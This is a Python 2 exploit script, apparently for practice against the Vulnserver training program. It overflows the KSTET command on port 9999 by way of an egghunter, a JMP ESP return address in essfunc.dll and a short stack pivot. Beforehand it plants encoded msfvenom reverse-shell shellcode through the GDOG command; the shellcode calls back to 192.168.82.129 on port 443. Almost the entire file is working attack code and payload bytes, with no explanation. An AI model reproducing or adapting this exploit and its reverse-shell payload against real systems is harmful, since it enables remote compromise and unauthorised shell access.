#!/usr/bin/python

import sys, socket

ip = "192.168.82.128"
port = 9999

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip, port))
	print "[*] Connection successful"
except:
	print "[!] Connection failed.  Exiting..."
	sys.exit(1)

# Payload size: 710 bytes
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.82.129 LPORT=443 --arch x86 --platform windows -f c -e x86/shikata_ga_nai -b "\x00"
shellcode = ("T00WT00W" + "\x90" * 16 + 
"\xda\xd8\xba\x2f\x33\xa4\xa0\xd9\x74\x24\xf4\x5d\x29\xc9\xb1"
"\x52\x31\x55\x17\x83\xed\xfc\x03\x7a\x20\x46\x55\x78\xae\x04"
"\x96\x80\x2f\x69\x1e\x65\x1e\xa9\x44\xee\x31\x19\x0e\xa2\xbd"
"\xd2\x42\x56\x35\x96\x4a\x59\xfe\x1d\xad\x54\xff\x0e\x8d\xf7"
"\x83\x4c\xc2\xd7\xba\x9e\x17\x16\xfa\xc3\xda\x4a\x53\x8f\x49"
"\x7a\xd0\xc5\x51\xf1\xaa\xc8\xd1\xe6\x7b\xea\xf0\xb9\xf0\xb5"
"\xd2\x38\xd4\xcd\x5a\x22\x39\xeb\x15\xd9\x89\x87\xa7\x0b\xc0"
"\x68\x0b\x72\xec\x9a\x55\xb3\xcb\x44\x20\xcd\x2f\xf8\x33\x0a"
"\x4d\x26\xb1\x88\xf5\xad\x61\x74\x07\x61\xf7\xff\x0b\xce\x73"
"\xa7\x0f\xd1\x50\xdc\x34\x5a\x57\x32\xbd\x18\x7c\x96\xe5\xfb"
"\x1d\x8f\x43\xad\x22\xcf\x2b\x12\x87\x84\xc6\x47\xba\xc7\x8e"
"\xa4\xf7\xf7\x4e\xa3\x80\x84\x7c\x6c\x3b\x02\xcd\xe5\xe5\xd5"
"\x32\xdc\x52\x49\xcd\xdf\xa2\x40\x0a\x8b\xf2\xfa\xbb\xb4\x98"
"\xfa\x44\x61\x0e\xaa\xea\xda\xef\x1a\x4b\x8b\x87\x70\x44\xf4"
"\xb8\x7b\x8e\x9d\x53\x86\x59\x62\x0b\xda\x18\x0a\x4e\xda\x1b"
"\x70\xc7\x3c\x71\x96\x8e\x97\xee\x0f\x8b\x63\x8e\xd0\x01\x0e"
"\x90\x5b\xa6\xef\x5f\xac\xc3\xe3\x08\x5c\x9e\x59\x9e\x63\x34"
"\xf5\x7c\xf1\xd3\x05\x0a\xea\x4b\x52\x5b\xdc\x85\x36\x71\x47"
"\x3c\x24\x88\x11\x07\xec\x57\xe2\x86\xed\x1a\x5e\xad\xfd\xe2"
"\x5f\xe9\xa9\xba\x09\xa7\x07\x7d\xe0\x09\xf1\xd7\x5f\xc0\x95"
"\xae\x93\xd3\xe3\xae\xf9\xa5\x0b\x1e\x54\xf0\x34\xaf\x30\xf4"
"\x4d\xcd\xa0\xfb\x84\x55\xd0\xb1\x84\xfc\x79\x1c\x5d\xbd\xe7"
"\x9f\x88\x82\x11\x1c\x38\x7b\xe6\x3c\x49\x7e\xa2\xfa\xa2\xf2"
"\xbb\x6e\xc4\xa1\xbc\xba")



# Egg: W00TW00T
egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")


# Buffer size: 5005 bytes
# [*] Exact match at offset 66
# JMP ESP address, essfunc.dll: 625011AF
# JMP ESP leads to a 20 byte space
# SUB ESP,JMP ESP --> 83 EC 45 FF E4

evil = "\x90" * 5 + "\x83\xc4\x45" + egghunter + "\x41" * (66 - 8 - len(egghunter)) + "\xAF\x11\x50\x62" + "\x83\xec\x45\xff\xe4" + "\x43" * (5005 - 66 - 4 - 5)


buffer = "KSTET /.:/" + evil + "\r\n"


s.send("GDOG " + shellcode)
s.recv(1024)

s.send(buffer)
s.close()
print "[*] Payload sent"